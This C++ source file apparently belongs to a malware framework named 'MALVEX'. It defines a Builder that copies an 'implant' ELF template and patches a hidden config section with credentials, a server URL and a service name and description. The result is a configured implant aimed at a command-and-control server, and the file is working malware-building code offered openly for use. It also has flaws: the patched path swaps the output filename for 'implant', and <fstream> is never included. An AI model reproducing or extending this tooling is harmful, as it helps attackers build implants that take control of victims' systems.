#include "Builder.hpp"
#include <ImplantConfig.hpp>

#include <elfio/elfio.hpp>

#include <cstring>
#include <filesystem>
#include <iterator>

//--------------------------------
//
//--------------------------------
Builder& Builder::instance() {
    static Builder instance;
    return instance;
}

//--------------------------------
//
//--------------------------------
void Builder::setUsername(const std::string& username) {
    std::strncpy(m_config.username, username.c_str(), std::size(m_config.username) - 1);
    m_config.username[sizeof(m_config.username) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
void Builder::setPassword(const std::string& password) {
    std::strncpy(m_config.password, password.c_str(), std::size(m_config.password) - 1);
    m_config.password[sizeof(m_config.password) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
void Builder::setTimeout(const std::string& timeout) {
    std::strncpy(m_config.default_timeout, timeout.c_str(), std::size(m_config.default_timeout) - 1);
    m_config.default_timeout[sizeof(m_config.default_timeout) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
void Builder::setServerURL(const std::string& server_url) {
    std::strncpy(m_config.server_url, server_url.c_str(), std::size(m_config.server_url) - 1);
    m_config.server_url[sizeof(m_config.server_url) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
void Builder::setServiceName(const std::string& service_name) {
    std::strncpy(m_config.service_name, service_name.c_str(), std::size(m_config.service_name) - 1);
    m_config.service_name[sizeof(m_config.service_name) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
void Builder::setServiceDesc(const std::string& service_description) {
    std::strncpy(m_config.service_desc, service_description.c_str(), std::size(m_config.service_desc) - 1);
    m_config.service_desc[sizeof(m_config.service_desc) - 1] = '\0';
}

//--------------------------------
//
//--------------------------------
bool Builder::buildImplant(const std::string& output_path) {
    using namespace ELFIO;

    std::filesystem::path input_file("implant");

    // check if the template file exists
    if (not std::filesystem::exists(input_file)) {
        //TODO: add logging
        return false;
    }

    // copy the template file to the output location
    if (not std::filesystem::copy_file(input_file, output_path)) {
        //TODO: add logging
        return false;
    }

    auto output_file = std::filesystem::path(output_path).replace_filename(input_file.filename());

    elfio reader;
    if (not reader.load(output_file)) {
        //TODO: add logging
        return false;
    }

    // locate the custom section
    //Elf_Word section_index{ 0 };
    std::string config_section_name = std::string(MALVEX_CONFIG_SECTION_NAME);
    section* config_section = nullptr;

    for (int i{ 0 }; i < reader.sections.size(); ++i) {
        if (reader.sections[i]->get_name() == config_section_name) {
            config_section = reader.sections[i];
            //TODO: add logging about the found section
            break;
        }
    }

    if (not config_section) {
        //TODO: logging: no section found
        return false;
    }

    // prepare the new configuration data
    ImplantConfig new_config;

    // use strncpy to safely copy and null-terminate the strings
    std::strncpy(new_config.username, m_config.username, sizeof(new_config.username) - 1);
    new_config.username[sizeof(new_config.username) - 1] = '\0';

    std::strncpy(new_config.password, m_config.password, sizeof(new_config.password) - 1);
    new_config.password[sizeof(new_config.password) - 1] = '\0';

    std::strncpy(new_config.default_timeout, m_config.default_timeout, sizeof(new_config.default_timeout) - 1);
    new_config.default_timeout[sizeof(new_config.default_timeout) - 1] = '\0';

    std::strncpy(new_config.server_url, m_config.server_url, sizeof(new_config.server_url) - 1);
    new_config.server_url[sizeof(new_config.server_url) - 1] = '\0';

    std::strncpy(new_config.service_name, m_config.service_name, sizeof(new_config.service_name) - 1);
    new_config.service_name[sizeof(new_config.service_name) - 1] = '\0';

    std::strncpy(new_config.service_desc, m_config.service_desc, sizeof(new_config.service_desc) - 1);
    new_config.service_desc[sizeof(new_config.service_desc) - 1] = '\0';


    // Verify size match
    if (config_section->get_size() != sizeof(ImplantConfig)) {
        // TODO: logging size missmatch
        return false;
    }

    // overwrite the data in the file
    // Get the file offset where the section data resides
    Elf_Xword offset = config_section->get_offset();

    std::fstream file(output_file, std::ios::in | std::ios::out | std::ios::binary);
    if (not file.is_open()) {
        //TODO: logging
        return false;
    }

    // Seek to the correct offset
    file.seekp(offset);

    // Write the new structure's raw bytes
    file.write(reinterpret_cast<const char*>(&new_config), sizeof(ImplantConfig));

    if (file.fail()) {
        //TODO: logging
        return false;
    }

    file.close();

    //TODO: logging (where was the file written?)
    return true;
}